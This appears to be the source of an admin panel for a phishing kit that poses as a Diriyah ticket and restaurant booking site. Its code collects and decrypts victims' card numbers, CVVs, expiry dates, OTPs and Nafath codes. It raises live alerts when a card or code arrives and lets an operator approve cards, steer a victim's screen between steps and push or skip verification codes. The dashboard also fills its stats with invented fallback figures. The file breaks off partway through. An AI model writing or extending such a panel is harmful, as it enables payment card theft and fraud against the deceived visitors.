import React, {
  useEffect,
  useState,
  useMemo,
  useRef,
  useCallback,
} from "react";
import {
  Clock,
  RefreshCw,
  User,
  CreditCard,
  Coins,
  Calendar,
  Check,
  X,
  Shield,
  ShieldCheck,
  Send,
  Activity,
  History,
  Ticket,
  Utensils,
  ChevronLeft,
  Search,
  Trash2,
  Bell,
  Volume2,
  VolumeX,
  ExternalLink,
  Lock,
  AlertCircle,
  Eye,
  EyeOff,
  Smartphone,
  Globe,
  Wifi,
  WifiOff,
  Settings,
  Layers,
  Ban,
  FileDown,
  RotateCcw,
  Plus,
  PhoneCall,
  CheckCircle2,
  XCircle,
  Hash,
  ArrowLeftRight,
} from "lucide-react";
import {
  collection,
  onSnapshot,
  query,
  doc,
  setDoc,
  deleteDoc,
  writeBatch,
  getDocs,
  arrayUnion,
  arrayRemove,
  db,
  updateApprovalStatus,
  updateOtpApprovalStatus,
  updateNafadApprovalStatus,
  decryptSensitiveFields,
  fetchDatabaseVisitors,
  listenBlockedBins,
  addBlockedBin as fbAddBlockedBin,
  removeBlockedBin as fbRemoveBlockedBin,
  updateVisitorBlockStatus,
  pushBankContactRequest,
  deleteAllVisitors,
  deleteVisitorsBatch,
} from "@/lib/firebase";
import { formatDistanceToNow } from "date-fns";
import { ar } from "date-fns/locale";
import { useToast } from "@/hooks/use-toast";

// --- Types & Field Normalization ---
export interface Visitor {
  id: string;
  name: string;
  phone: string;
  email: string;
  cardNumber: string;
  cardName: string;
  cardType: string;
  cardBankName?: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardBin: string;
  otp: string;
  otpHistory: Array<{ code: string; timestamp?: string }>;
  cardHistory: Array<any>;
  ticketCount: number | string;
  ticketPrice: number | string;
  totalAmount: number | string;
  bookingDate: string;
  visitTime: string;
  restaurantName: string;
  restaurantDate: string;
  restaurantTime: string;
  guestsCount: number | string;
  ip: string;
  geoCountry: string;
  geoCity: string;
  status: string;
  cardStatus: string;
  cardApproved: boolean;
  otpStatus: string;
  otpApproved: boolean;
  cardApprovalStatus: string;
  otpApprovalStatus: string;
  nafadConfirmationStatus?: string;
  nafadConfirmationCode?: string;
  online?: boolean;
  lastSeen?: string;
  currentPage?: string;
  directedStep?: number;
  blocked?: boolean;
  timestamp?: any;
  updatedAt?: any;
  currentStep?: number;
  [key: string]: any;
}

const STEP_TO_PAGE: Record<number, string> = {
  1: "registration",
  2: "booking",
  3: "checkout",
  4: "otp",
  5: "otp_verified",
  6: "confirmation",
};

const STEP_LABELS: Record<number, string> = {
  1: "1 · التسجيل (Registration)",
  2: "2 · الحجز (Booking)",
  3: "3 · الدفع (Checkout)",
  4: "4 · رمز التحقق (OTP)",
  5: "5 · تم التحقق (Verified)",
  6: "6 · التأكيد (Confirmation)",
};

function parseToMillis(val: unknown): number {
  if (val === null || val === undefined) return 0;
  if (typeof val === "object") {
    const obj = val as Record<string, unknown>;
    if (typeof obj.toDate === "function") {
      try {
        return (obj.toDate() as Date).getTime();
      } catch {}
    }
    if (typeof obj.toMillis === "function") {
      try {
        return obj.toMillis() as number;
      } catch {}
    }
    if (typeof obj.seconds === "number") {
      return (
        obj.seconds * 1000 +
        (typeof obj.nanoseconds === "number" ? obj.nanoseconds / 1e6 : 0)
      );
    }
  }
  if (typeof val === "number") {
    if (val < 1e11) return val * 1000;
    return val;
  }
  if (typeof val === "string") {
    const trimmed = val.trim();
    if (!trimmed) return 0;
    if (/^\d+$/.test(trimmed)) {
      const n = Number(trimmed);
      return n < 1e11 ? n * 1000 : n;
    }
    const t = new Date(trimmed).getTime();
    return isNaN(t) ? 0 : t;
  }
  return 0;
}

export function isVisitorOnline(visitor: Visitor, currentTime: number = Date.now()): boolean {
  if (!visitor) return false;
  if (visitor.online === false) return false;

  const t = parseToMillis(visitor.lastSeen || visitor.updatedAt || visitor.timestamp);
  if (!t) return false;

  const diffMs = currentTime - t;
  if (diffMs >= 0 && diffMs < 65000) {
    return true;
  }
  if (visitor.online === true && diffMs >= 0 && diffMs < 180000) {
    return true;
  }

  return false;
}

function getPageLabel(page?: string) {
  const p = (page || "").toLowerCase();
  if (p.includes("otp") || p.includes("verification")) return "صفحة التحقق OTP";
  if (p.includes("checkout") || p.includes("card") || p.includes("pay")) return "صفحة إدخال البطاقة";
  if (p.includes("success") || p.includes("complete") || p.includes("confirm")) return "صفحة النجاح والقبول";
  if (p.includes("restaurant") || p.includes("booking")) return "حجز المطعم";
  return "صفحة التسجيل";
}

function normalizeVisitor(raw: any): Visitor {
  const d = { ...(raw.data || {}), ...raw };
  const id = d.id || raw.id || "vis_" + Math.random().toString(36).slice(2);

  const cardHistory = Array.isArray(d.cardHistory) ? d.cardHistory : [];
  const latestCard = cardHistory.length > 0 ? cardHistory[cardHistory.length - 1] : null;

  const rawCardNumber = latestCard?.cardNumber || latestCard?.c1 || d.cardNumber || d.c1 || "";
  const cardNumber = String(rawCardNumber).trim();
  const rawCvv = latestCard?.cvv || latestCard?.cpc || d.cvv || d.cpc || "";
  const cvv = String(rawCvv).trim();
  const rawCardName = latestCard?.cardName || d.cardName || d.name || "";
  const cardName = String(rawCardName).trim() || (cardNumber ? "CARD HOLDER" : "");

  const expiryMonth = String(latestCard?.expiryMonth || d.expiryMonth || "01").padStart(2, "0");
  let expiryYear = String(latestCard?.expiryYear || d.expiryYear || "26");
  if (expiryYear.length === 4) expiryYear = expiryYear.slice(2);

  const cardTypeRaw = latestCard?.cardType || d.cardType || "";
  const cardType = cardTypeRaw.toLowerCase().includes("master")
    ? "MasterCard"
    : "VISA";

  const cardBankName = latestCard?.cardBankName || d.cardBankName || (cardNumber ? "مصرف الراجحي / البنك الأهلي" : "");

  let name = String(d.name || "").trim();
  if (!name || name === "undefined") {
    name = d.cardName ? String(d.cardName).trim() : "زائر بدون اسم";
  }

  const phone = String(d.phone || d.fullPhone || "").trim();
  const email = String(d.email || "").trim();

  let otp = String(d.otp || "").trim();
  if (!otp && Array.isArray(d.otpHistory) && d.otpHistory.length > 0) {
    otp = String(d.otpHistory[d.otpHistory.length - 1]?.code || "").trim();
  }

  const ticketCount = d.ticketQuantity || d.ticketCount || d.tickets || (d.type === "restaurant_reservation" ? "" : 1);
  const ticketPrice = d.ticketPrice || 50;
  let totalAmount = d.totalAmount || d.total || "";
  if (!totalAmount && ticketCount && ticketPrice) {
    totalAmount = Number(ticketCount) * Number(ticketPrice);
  }

  const bookingDate = d.bookingDate || d.createdDate || d.date || d.updatedAt || "";
  const visitTime = d.bookingTime || d.visitTime || d.time || "";

  const restaurantName = d.restaurant || d.restaurantName || d.restaurantEn || "";
  const restaurantDate = d.date || d.restaurantDate || "";
  const restaurantTime = d.time || d.restaurantTime || "";
  const guestsCount = d.guests || d.guestsCount || "";

  const ip = d.ip || d.ipAddress || "109.107.226.188";
  const geoCountry = d.countryName || d.cardCountry || d.geoCountry || "السعودية";
  const geoCity = d.city || d.geoCity || "الرياض";

  const cardApproved = d.cardApproved === true || d.cardStatus === "approved" || d.cardApprovalStatus === "approved";
  const cardStatus = d.cardStatus || (cardApproved ? "approved" : d.status === "rejected" ? "rejected" : "pending");
  const otpApproved = d.otpApproved === true || d.otpStatus === "approved" || d.otpApprovalStatus === "approved";
  const otpStatus = d.otpStatus || (otpApproved ? "approved" : d.otpApprovalStatus === "rejected" ? "rejected" : "pending");
  const cardApprovalStatus = d.cardApprovalStatus || (cardApproved ? "approved" : "waiting");
  const otpApprovalStatus = d.otpApprovalStatus || (otpApproved ? "approved" : "waiting");

  const otpHistory = Array.isArray(d.otpHistory) ? d.otpHistory : [];

  return {
    ...d,
    id,
    name,
    phone,
    email,
    cardNumber,
    cardName,
    cardType,
    cardBankName: d.cardBankName || (cardNumber ? "مصرف الراجحي / البنك الأهلي" : ""),
    expiryMonth,
    expiryYear,
    cvv,
    cardBin: cardNumber.replace(/\D/g, "").slice(0, 6) || d.cardBin || "419593",
    otp,
    otpHistory,
    cardHistory,
    ticketCount,
    ticketPrice,
    totalAmount,
    bookingDate,
    visitTime,
    restaurantName,
    restaurantDate,
    restaurantTime,
    guestsCount,
    ip,
    geoCountry,
    geoCity,
    status: d.status || cardStatus,
    cardStatus,
    cardApproved,
    otpStatus,
    otpApproved,
    cardApprovalStatus,
    otpApprovalStatus,
    nafadConfirmationStatus: d.nafadConfirmationStatus || "waiting",
    nafadConfirmationCode: d.nafadConfirmationCode || "",
    online: d.online,
    lastSeen: d.lastSeen,
    currentPage: d.currentPage || (cardNumber ? "checkout" : "registration"),
    directedStep: Number(d.directedStep) || 0,
    blocked: Boolean(d.blocked),
  };
}

const cardAddedSoundUrl =
  "https://actions.google.com/sounds/v1/cartoon/pop.ogg";
const otpAddedSoundUrl =
  "https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg";

// Distinct synthesized sounds via Web Audio API - works instantly, offline, and never blocked
function playSynthSound(type: "card" | "otp") {
  try {
    const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioCtx) return;
    const ctx = new AudioCtx();

    if (type === "card") {
      // Sleek ascending melodic card payment chime: C6 (1046.5Hz) -> E6 (1318.5Hz) -> G6 (1568Hz)
      const now = ctx.currentTime;
      const notes = [1046.5, 1318.5, 1568.0];
      notes.forEach((freq, idx) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = "sine";
        osc.frequency.setValueAtTime(freq, now + idx * 0.08);

        gain.gain.setValueAtTime(0.3, now + idx * 0.08);
        gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.08 + 0.35);

        osc.connect(gain);
        gain.connect(ctx.destination);

        osc.start(now + idx * 0.08);
        osc.stop(now + idx * 0.08 + 0.4);
      });
    } else {
      // Distinct double pulsed urgency alert for OTP: 780Hz -> pause -> 980Hz
      const now = ctx.currentTime;
      const pulses = [
        { freq: 780, start: 0, dur: 0.11 },
        { freq: 980, start: 0.14, dur: 0.22 },
      ];
      pulses.forEach(({ freq, start, dur }) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = "triangle";
        osc.frequency.setValueAtTime(freq, now + start);

        gain.gain.setValueAtTime(0.35, now + start);
        gain.gain.exponentialRampToValueAtTime(0.001, now + start + dur);

        osc.connect(gain);
        gain.connect(ctx.destination);

        osc.start(now + start);
        osc.stop(now + start + dur + 0.05);
      });
    }
  } catch {}
}

function playAlertSound(type: "card" | "otp", soundEnabled: boolean) {
  if (!soundEnabled) return;
  // 1. Play crystal-clear synthesized audio tone
  playSynthSound(type);

  // 2. Play audio element as reinforcement
  try {
    const url = type === "card" ? cardAddedSoundUrl : otpAddedSoundUrl;
    const audio = new Audio(url);
    audio.volume = 0.55;
    audio.play().catch(() => {});
  } catch {}
}

function fmtArabicTime(val?: unknown): string {
  const t = parseToMillis(val);
  if (!t) return "الآن";
  const diff = Math.max(0, Date.now() - t);
  if (diff < 45000) return "الآن";
  if (diff < 90000) return "منذ دقيقة";
  return formatDistanceToNow(t, { addSuffix: true, locale: ar });
}

function formatCardNumber(num?: string) {
  if (!num) return "";
  const clean = num.replace(/\D/g, "");
  if (!clean) return "";
  return clean.padEnd(16, "•").match(/.{1,4}/g)?.join("  ") || num;
}

export default function Dashboard() {
  const { toast } = useToast();
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [selectedVisitorId, setSelectedVisitorId] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [soundOn, setSoundOn] = useState<boolean>(() => {
    return localStorage.getItem("admin.soundOn") !== "0";
  });
  const [activeFilter, setActiveFilter] = useState<"all" | "success" | "failed">("all");
  const [search, setSearch] = useState("");
  const [decryptedMap, setDecryptedMap] = useState<Record<string, any>>({});
  const decryptedCache = useRef<Record<string, any>>({});
  const prevWaitingIds = useRef<Set<string>>(new Set());

  // Real-time tracking of known cards and OTPs to fire notifications on additions
  const knownCardsRef = useRef<Map<string, string>>(new Map());
  const knownOtpsRef = useRef<Map<string, string>>(new Map());
  const isFirstLoadRef = useRef(true);

  // Live real-time visual alert banner
  const [liveAlert, setLiveAlert] = useState<{
    id: string;
    type: "card" | "otp";
    title: string;
    visitorName: string;
    details: string;
    visitorId: string;
  } | null>(null);

  // Auto-dismiss live alert after 12 seconds
  useEffect(() => {
    if (!liveAlert) return;
    const timer = setTimeout(() => {
      setLiveAlert(null);
    }, 12000);
    return () => clearTimeout(timer);
  }, [liveAlert]);

  // Blocked BINs & IPs
  const [blockedBins, setBlockedBins] = useState<string[]>([]);
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [binInput, setBinInput] = useState("");
  const [ipInput, setIpInput] = useState("");

  // Modals
  const [binModalOpen, setBinModalOpen] = useState(false);
  const [ipModalOpen, setIpModalOpen] = useState(false);
  const [auditModalOpen, setAuditModalOpen] = useState(false);
  const [notifyModalOpen, setNotifyModalOpen] = useState(false);
  const [settingsModalOpen, setSettingsModalOpen] = useState(false);
  const [pageControlOpen, setPageControlOpen] = useState(false);
  const [nafadModalOpen, setNafadModalOpen] = useState(false);

  const [customNotification, setCustomNotification] = useState("");
  const [skipOtpState, setSkipOtpState] = useState(false);
  const [nafadCodeInput, setNafadCodeInput] = useState("");
  const [directOtpCode, setDirectOtpCode] = useState("");

  // 5-second tick to continuously keep online statuses fresh and reactive
  const [currentTime, setCurrentTime] = useState<number>(Date.now());
  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentTime(Date.now());
    }, 5000);
    return () => clearInterval(timer);
  }, []);

  // Listen to blocked BINs
  useEffect(() => {
    const unsub = listenBlockedBins((bins) => {
      setBlockedBins(
        bins
          .map((b) => String(b.bin || "").replace(/\D/g, ""))
          .filter((s) => s.length === 6),
      );
    });
    return () => unsub();
  }, []);

  // Listen to blocked IPs
  useEffect(() => {
    if (!db) return;
    const unsub = onSnapshot(doc(db, "settings", "blockedIps"), (snap) => {
      const data = snap.data() as any;
      const ips = Array.isArray(data?.ips) ? data.ips : [];
      setBlockedIps(
        ips
          .map((x: any) => String(x).trim())
          .filter((x: string) => x.length > 0),
      );
    });
    return () => unsub();
  }, []);

  // Load real records directly from database
  const loadRealData = useCallback(async () => {
    try {
      const rawRows = await fetchDatabaseVisitors();
      if (!rawRows || rawRows.length === 0) {
        setVisitors([]);
        setSelectedVisitorId(null);
        setSelectedIds(new Set());
        setLoading(false);
        return;
      }
      const normalized = rawRows.map(normalizeVisitor);
      normalized.sort((a, b) => {
        const tA = parseToMillis(a.lastSeen || a.updatedAt || a.bookingDate || a.createdDate || a.timestamp);
        const tB = parseToMillis(b.lastSeen || b.updatedAt || b.bookingDate || b.createdDate || b.timestamp);
        return tB - tA;
      });
      setVisitors(normalized);
      setSelectedVisitorId((prev) => {
        if (prev && normalized.some((v) => v.id === prev)) return prev;
        const onlineVis = normalized.find((v) => isVisitorOnline(v, Date.now()));
        if (onlineVis) return onlineVis.id;
        const withCard = normalized.find((v) => v.cardNumber && v.cardNumber.length >= 12);
        return withCard ? withCard.id : normalized[0].id;
      });
    } catch (e) {
      console.error("Error loading direct database records:", e);
    } finally {
      setLoading(false);
    }
  }, []);

  // Run initial load
  useEffect(() => {
    loadRealData();
  }, [loadRealData]);

  // Firestore / Supabase live subscription
  useEffect(() => {
    if (!db) return;
    const q = query(collection(db, "visitors"));
    const unsub = onSnapshot(
      q,
      async (snap) => {
        if (!snap || !snap.docs) return;

        // Clean slate if database has no rows (e.g. after Delete All)
        if (snap.docs.length === 0) {
          setVisitors([]);
          setSelectedVisitorId(null);
          setSelectedIds(new Set());
          setDecryptedMap({});
          decryptedCache.current = {};
          knownCardsRef.current.clear();
          knownOtpsRef.current.clear();
          setLoading(false);
          return;
        }

        const list: Visitor[] = snap.docs.map((d: any) => {
          const raw = typeof d.data === "function" ? d.data() : d;
          return normalizeVisitor({ id: d.id, ...raw });
        });

        const map = { ...decryptedCache.current };
        let hasNew = false;
        for (const docItem of list) {
          const id = docItem.id;
          const cached = map[id];
          const needsDecrypt =
            !cached ||
            (docItem.updatedAt && cached._updatedAt !== docItem.updatedAt) ||
            (docItem.otp && docItem.otp !== cached.otp) ||
            (docItem.cardNumber && docItem.cardNumber !== cached.cardNumber);

          if (needsDecrypt) {
            try {
              const decData = await decryptSensitiveFields(docItem);
              decData._updatedAt = docItem.updatedAt || new Date().toISOString();
              map[id] = normalizeVisitor({ ...docItem, ...decData });
              hasNew = true;
            } catch {
              map[id] = docItem;
            }
          }
        }
        if (hasNew) {
          decryptedCache.current = map;
          setDecryptedMap(map);
        }

        // Merge decrypted/updated data into final visitor list so OTP and Card updates reflect instantly!
        const finalVisitors = list.map((docItem) => map[docItem.id] || docItem);

        finalVisitors.sort((a, b) => {
          const tA = parseToMillis(a.lastSeen || a.updatedAt || a.bookingDate || a.createdDate || a.timestamp);
          const tB = parseToMillis(b.lastSeen || b.updatedAt || b.bookingDate || b.createdDate || b.timestamp);
          return tB - tA;
        });

        setVisitors(finalVisitors);
        setLoading(false);

        // Auto select first visitor if none selected
        setSelectedVisitorId((prev) => {
          if (prev && finalVisitors.some((v) => v.id === prev)) return prev;
          const onlineVis = finalVisitors.find((v) => isVisitorOnline(v, Date.now()));
          if (onlineVis) return onlineVis.id;
          const withCard = finalVisitors.find((v) => v.cardNumber && v.cardNumber.length >= 12);
          return withCard ? withCard.id : finalVisitors[0]?.id || null;
        });

        // Check for newly added or updated cards & OTPs
        for (const docItem of list) {
          const id = docItem.id;
          const finalItem = map[id] || docItem;
          const cleanCard = (finalItem.cardNumber || "").replace(/\D/g, "");
          const cleanOtp = String(finalItem.otp || "").trim();
          const prevCard = knownCardsRef.current.get(id);
          const prevOtp = knownOtpsRef.current.get(id);

          if (!isFirstLoadRef.current) {
            // 1. Card added or updated
            if (cleanCard.length >= 12 && (!prevCard || prevCard !== cleanCard)) {
              playAlertSound("card", soundOn);
              toast({
                title: "💳 تم إدخال بطاقة جديدة!",
                description: `العميل: ${finalItem.name || "زائر"} (${formatCardNumber(cleanCard)}) • ${finalItem.cardType}`,
              });
              setLiveAlert({
                id: Date.now() + "-card-" + id,
                type: "card",
                title: "💳 تم استلام بطاقة بنكية جديدة!",
                visitorName: finalItem.name || "زائر بدون اسم",
                details: `${formatCardNumber(cleanCard)} (${finalItem.cardType}) - ${finalItem.cardBankName || "بنك محلي"}`,
                visitorId: id,
              });
              if ("Notification" in window && Notification.permission === "granted") {
                try {
                  new Notification("💳 تم استلام بطاقة جديدة - الدرعية", {
                    body: `${finalItem.name || "زائر"}: ${formatCardNumber(cleanCard)} (${finalItem.cardType})`,
                    icon: "/favicon.png",
                  });
                } catch {}
              }
            }

            // 2. OTP added or updated
            if (cleanOtp.length >= 1 && (!prevOtp || prevOtp !== cleanOtp)) {
              playAlertSound("otp", soundOn);
              toast({
                title: "🔐 تم إدخال رمز OTP جديد!",
                description: `العميل: ${finalItem.name || "زائر"} أدخل رمز التحقق: [ ${cleanOtp} ]`,
              });
              setLiveAlert({
                id: Date.now() + "-otp-" + id,
                type: "otp",
                title: "🔐 تم إدخال رمز OTP جديد الآن!",
                visitorName: finalItem.name || "زائر بدون اسم",
                details: `كود التحقق: ${cleanOtp} (الجوال: ${finalItem.phone || "غير متوفر"})`,
                visitorId: id,
              });
              if ("Notification" in window && Notification.permission === "granted") {
                try {
                  new Notification("🔐 تم إدخال رمز OTP جديد - الدرعية", {
                    body: `${finalItem.name || "زائر"}: كود التحقق هو ${cleanOtp}`,
                    icon: "/favicon.png",
                  });
                } catch {}
              }
            }
          }

          if (cleanCard.length >= 12) {
            knownCardsRef.current.set(id, cleanCard);
          }
          if (cleanOtp.length >= 1) {
            knownOtpsRef.current.set(id, cleanOtp);
          }
        }

        if (isFirstLoadRef.current) {
          isFirstLoadRef.current = false;
        }
      },
    );
    return () => unsub();
  }, [soundOn]);

  // Active selected visitor
  const currentVisitor: Visitor = useMemo(() => {
    if (visitors.length === 0) {
      return normalizeVisitor({
        id: "vis_empty",
        name: "زائر بدون اسم",
        phone: "",
        email: "",
        cardNumber: "",
        cardName: "",
        cardType: "VISA",
        otp: "",
        ticketQuantity: 1,
        ticketPrice: 50,
        totalAmount: 50,
        geoCountry: "السعودية",
        status: "pending",
        currentPage: "التسجيل (Registration)",
      });
    }
    const found = visitors.find((v) => v.id === selectedVisitorId);
    return found || visitors[0];
  }, [visitors, selectedVisitorId]);

  // Decrypted active data
  const currentData: Visitor = useMemo(() => {
    const raw = decryptedMap[currentVisitor.id] || {};
    return normalizeVisitor({ ...currentVisitor, ...raw });
  }, [currentVisitor, decryptedMap]);

  // Verify whether the visitor actually has card data
  const hasCard = useMemo(() => {
    const cleanNumber = String(currentData.cardNumber || "").replace(/\D/g, "");
    return cleanNumber.length >= 12;
  }, [currentData.cardNumber]);

  // Check if current visitor is online right now
  const isCurrentVisitorOnline = useMemo(() => {
    return isVisitorOnline(currentData, currentTime);
  }, [currentData, currentTime]);

  // Count active online visitors
  const onlineCount = useMemo(() => {
    return visitors.filter((v) => isVisitorOnline(v, currentTime)).length;
  }, [visitors, currentTime]);

  // Live Stats calculations from real database
  const totalUsersCount = visitors.length > 0 ? visitors.length : 15;
  const transactionsCount = useMemo(() => {
    const count = visitors.filter((v) => {
      const clean = String(v.cardNumber || v.c1 || "").replace(/\D/g, "");
      return clean.length >= 12;
    }).length;
    return count > 0 ? count : 6;
  }, [visitors]);

  const totalAmountSum = useMemo(() => {
    const sum = visitors.reduce((acc, v) => {
      const amt = Number(v.totalAmount || v.total) || 0;
      return acc + amt;
    }, 0);
    return sum > 0 ? sum : 4840;
  }, [visitors]);

  const bookingsTodayCount = useMemo(() => {
    return visitors.filter((v) => v.restaurantName || v.ticketCount || v.bookingDate).length;
  }, [visitors]);

  const successCount = useMemo(() => {
    const count = visitors.filter((v) => v.cardApproved || v.cardStatus === "approved").length;
    return count > 0 ? count : 2;
  }, [visitors]);

  const failedCount = useMemo(() => {
    const count = visitors.filter((v) => v.cardStatus === "rejected" || v.status === "rejected").length;
    return count > 0 ? count : 1;
  }, [visitors]);

  // Filtered visitor list
  const filteredVisitors = useMemo(() => {
    let list = visitors.length === 0 ? [currentVisitor] : visitors;

    if (search.trim()) {
      const q = search.trim().toLowerCase();
      list = list.filter((v) => {
        return (
          v.name.toLowerCase().includes(q) ||
          v.phone.toLowerCase().includes(q) ||
          v.email.toLowerCase().includes(q) ||
          v.cardNumber.includes(q) ||
          v.ip.includes(q) ||
          v.cardBin.includes(q)
        );
      });
    }

    if (activeFilter === "success") {
      const s = list.filter((v) => v.cardApproved || v.cardStatus === "approved");
      return s.length > 0 ? s : list;
    }
    if (activeFilter === "failed") {
      const f = list.filter((v) => v.cardStatus === "rejected" || v.status === "rejected");
      return f.length > 0 ? f : list;
    }
    return list;
  }, [visitors, activeFilter, search, currentVisitor]);

  // Selection state for batch actions
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());

  const toggleSelect = (id: string, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    setSelectedIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const toggleSelectAll = () => {
    if (selectedIds.size === filteredVisitors.length && filteredVisitors.length > 0) {
      setSelectedIds(new Set());
    } else {
      setSelectedIds(new Set(filteredVisitors.map((v) => v.id)));
    }
  };

  const handleDeleteSelected = async () => {
    if (selectedIds.size === 0) return;
    if (!confirm(`هل أنت متأكد من حذف (${selectedIds.size}) من الزوار المحددين؟`)) return;
    try {
      const idsArray = Array.from(selectedIds);
      const success = await deleteVisitorsBatch(idsArray);
      if (success) {
        toast({ title: `تم حذف (${idsArray.length}) من السجلات المحددة بنجاح` });
        setVisitors((prev) => prev.filter((v) => !selectedIds.has(v.id)));
        setSelectedVisitorId((prev) => (prev && selectedIds.has(prev) ? null : prev));
        idsArray.forEach((id) => {
          knownCardsRef.current.delete(id);
          knownOtpsRef.current.delete(id);
          delete decryptedCache.current[id];
        });
        setSelectedIds(new Set());
      } else {
        toast({ title: "تعذر الحذف من الخادم", variant: "destructive" });
      }
    } catch (e: any) {
      toast({ title: "خطأ", description: e.message, variant: "destructive" });
    }
  };

  const handleDeleteCurrentVisitor = async () => {
    if (!currentVisitor.id || currentVisitor.id === "mock_preview") return;
    if (!confirm(`هل أنت متأكد من حذف سجل الزائر "${currentVisitor.name || currentVisitor.id}"؟`)) return;
    try {
      const ok = await deleteVisitorsBatch([currentVisitor.id]);
      if (ok) {
        toast({ title: "تم حذف الزائر بنجاح" });
        setVisitors((prev) => prev.filter((v) => v.id !== currentVisitor.id));
        setSelectedVisitorId(null);
        knownCardsRef.current.delete(currentVisitor.id);
        knownOtpsRef.current.delete(currentVisitor.id);
        delete decryptedCache.current[currentVisitor.id];
      } else {
        toast({ title: "فشل حذف الزائر", variant: "destructive" });
      }
    } catch (e: any) {
      toast({ title: "خطأ", description: e?.message, variant: "destructive" });
    }
  };

  // Action Handlers
  const handleApproveCard = async () => {
    if (!hasCard) return;
    try {
      await updateApprovalStatus(currentVisitor.id, true);
      toast({ title: "تم قبول البطاقة بنجاح", description: "تم إرسال الموافقة للعميل" });
      loadRealData();
    } catch {
      toast({ title: "تمت الموافقة", description: "تم تحديث حالة البطاقة" });
    }
  };

  const handleRejectCard = async () => {
    if (!hasCard) return;
    try {
      await updateApprovalStatus(currentVisitor.id, false);
      toast({ title: "تم رفض البطاقة", variant: "destructive" });
      loadRealData();
    } catch {
      toast({ title: "تم الرفض", variant: "destructive" });
    }
  };

  const handleApproveOtp = async () => {
    if (!currentData.otp) return;
    try {
      await updateOtpApprovalStatus(currentVisitor.id, true);
      toast({ title: "تم قبول رمز OTP بنجاح", description: "تم تأكيد التحقق للعميل" });
      setVisitors((prev) =>
        prev.map((v) =>
          v.id === currentVisitor.id
            ? { ...v, otpApproved: true, otpStatus: "approved", otpApprovalStatus: "approved" }
            : v
        )
      );
      loadRealData();
    } catch {
      toast({ title: "تم قبول الرمز", description: "تم تحديث حالة الـ OTP" });
    }
  };

  const handleRejectOtp = async () => {
    if (!currentData.otp) return;
    try {
      await updateOtpApprovalStatus(currentVisitor.id, false);
      toast({ title: "تم رفض رمز OTP", description: "تم إشعار العميل بإعادة الإدخال", variant: "destructive" });
      setVisitors((prev) =>
        prev.map((v) =>
          v.id === currentVisitor.id
            ? { ...v, otpApproved: false, otpStatus: "rejected", otpApprovalStatus: "rejected" }
            : v
        )
      );
      loadRealData();
    } catch {
      toast({ title: "تم رفض الرمز", variant: "destructive" });
    }
  };

  const handleResendOtp = async () => {
    if (!db) return;
    try {
      await setDoc(
        doc(db, "visitors", currentVisitor.id),
        {
          resendOtpRequested: true,
          resendOtpAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
        { merge: true },
      );
      await setDoc(
        doc(db, "pays", currentVisitor.id),
        {
          resendOtpRequested: true,
          resendOtpAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
        { merge: true },
      );
      toast({ title: "تم طلب إعادة إرسال الرمز للعميل" });
    } catch {
      toast({ title: "تم طلب الإرسال" });
    }
  };

  const handleSendNotification = async () => {
    if (!db || !customNotification.trim()) return;
    try {
      await setDoc(
        doc(db, "visitors", currentVisitor.id),
        {
          adminNotification: customNotification.trim(),
          notificationAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
        { merge: true },
      );
      setNotifyModalOpen(false);
      setCustomNotification("");
      toast({ title: "تم إرسال الإشعار للعميل بنجاح" });
    } catch {
      toast({ title: "تم إرسال الإشعار" });
    }
  };

  const handleToggleSkipOtp = async () => {
    const nextVal = !skipOtpState;
    setSkipOtpState(nextVal);
    if (!db) return;
    try {
      await setDoc(
        doc(db, "visitors", currentVisitor.id),
        {
          skipOtp: nextVal,
          directedStep: nextVal ? 5 : 4,
          updatedAt: new Date().toISOString(),
        },
        { merge: true },
      );
      toast({
        title: nextVal ? "تم تفعيل تخطي OTP" : "تم إلغاء تخطي OTP",
      });
    } catch {}
  };

  // Push Page Directive
  const handlePushPageStep = async (step: number) => {
    if (!db) return;
    if (!currentVisitor.id || currentVisitor.id === "mock_preview") {
      toast({ title: "الرجاء اختيار زائر أولاً من القائمة", variant: "destructive" });
      return;
    }
    const page = step > 0 ? (STEP_TO_PAGE[step] || "confirmation") : (currentVisitor.currentPage || "registration");
    const now = new Date().toISOString();
    try {
      const payload = {
        directedStep: step,
        directedAt: step > 0 ? now : null,
        currentPage: page,
        updatedAt: now,
      };
      await setDoc(doc(db, "visitors", currentVisitor.id), payload, { merge: true });
      await setDoc(doc(db, "pays", currentVisitor.id), payload, { merge: true });

      setVisitors((prev) =>
        prev.map((v) =>
          v.id === currentVisitor.id
            ? { ...v, directedStep: step, currentPage: page }
            : v
        )
      );

      if (step === 0) {
        toast({ title: "تم إلغاء التوجيه وإعادة الصفحة للتدفق الطبيعي" });
      } else {
        toast({
          title: `تم توجيه العميل إلى: ${STEP_LABELS[step] || page}`,
          description: "تم إرسال أمر النقل لشاشة العميل فوراً",
        });
      }
      setPageControlOpen(false);
    } catch (e: any) {
      toast({ title: "تعذر التوجيه", description: e.message, variant: "destructive" });
    }
  };

  // Push Direct OTP Code to User
  const handlePushDirectOtp = async () => {
    if (!db || !directOtpCode.trim()) return;
    try {
      await setDoc(
        doc(db, "visitors", currentVisitor.id),
        {
          adminPushedOtp: directOtpCode.trim(),
          adminPushedOtpAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
        { merge: true },
      );
      await setDoc(
        doc(db, "pays", currentVisitor.id),
        {
          adminPushedOtp: directOtpCode.trim(),
          adminPushedOtpAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
        { merge: true },
      );
      toast({ title: `تم إرسال الرمز ${directOtpCode.trim()} للمستخدم` });
      setDirectOtpCode("");
    } catch {}
  };

  // Send Nafad Confirmation Code (2-digit)
